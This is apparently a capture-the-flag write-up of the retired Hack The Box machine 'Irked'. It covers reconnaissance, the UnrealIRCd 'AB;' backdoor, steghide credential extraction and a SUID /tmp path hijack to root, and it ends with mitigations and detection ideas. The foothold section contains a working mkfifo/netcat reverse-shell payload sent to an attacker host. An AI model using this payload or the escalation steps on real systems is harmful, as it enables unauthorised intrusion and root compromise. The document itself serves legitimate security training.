---
machine: Irked
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, unrealircd, backdoor, cve-2010-2075, steghide, suid, path-hijack]
---

# Irked — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A trojanized UnrealIRCd 3.2.8.1 contains the 2010 backdoor: a line starting with `AB;` is passed to `system()`. The website hides a hint and an image with SSH credentials via steghide. User `djmardov` can run a SUID binary that calls `/tmp/listusers`; creating that file yields root.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,80,111,6697,8067,65534 <IP>
```

- SSH, HTTP, rpcbind and several IRC ports.
- The home page mentions IRC and shows an image.
- `nmap` labels port 6697 as UnrealIRCd.

## Enumeration

```bash
curl -s http://<IP>/ | head
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x txt,php
```

- The webroot contains an image and a hidden hint file.
- The hint describes a password for extracting data from the image.
- `searchsploit unrealircd 3.2.8.1` confirms the backdoor.

## Foothold

The backdoor interprets any line beginning with `AB;` and runs the remainder as a system command. Send a reverse shell over the IRC port.

```bash
nc <IP> 6697
AB; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> 443 >/tmp/f
```

The shell runs as `ircd`. Stabilize it with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

## Lateral movement

Download the website image and extract it with the hint password:

```bash
steghide extract -sf irked.jpg
cat creds.txt
ssh djmardov@<IP>
```

The extracted credentials allow SSH as `djmardov`; read `user.txt`.

## Privilege escalation

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/bin/viewuser
```

`viewuser` is root-owned SUID and runs `/tmp/listusers` without checking that the file is trusted. `/tmp` is world-writable.

```bash
printf '#!/bin/bash\n/bin/bash\n' > /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser
id
```

The resulting shell is root. A reverse shell can be used in the script instead.

## Evidence

- IRC response to the payload and `id` as `ircd`.
- `steghide` output and redacted credentials.
- `ls -l` of the SUID and `id` as root.
- Redacted flag.

## Lessons learned

- A service running a trojanized version is a backdoor, not a configuration bug.
- Steganography remains a transport for credentials.
- A SUID binary executing a writable path is a direct escalation.

## Mitigations and detection

- Verify software signatures and provenance; update UnrealIRCd.
- Do not publish hints or credentials in images or webroot files.
- Remove unnecessary SUID binaries and check absolute paths before execution.
- Alert on IRC connections containing `AB;`, service child processes and creation of `/tmp/listusers`.

## References

- <https://www.hackthebox.com/machines/Irked>
- <https://nvd.nist.gov/vuln/detail/CVE-2010-2075>
- <https://attack.mitre.org/techniques/T1195/002/>
- <https://attack.mitre.org/techniques/T1548/001/>
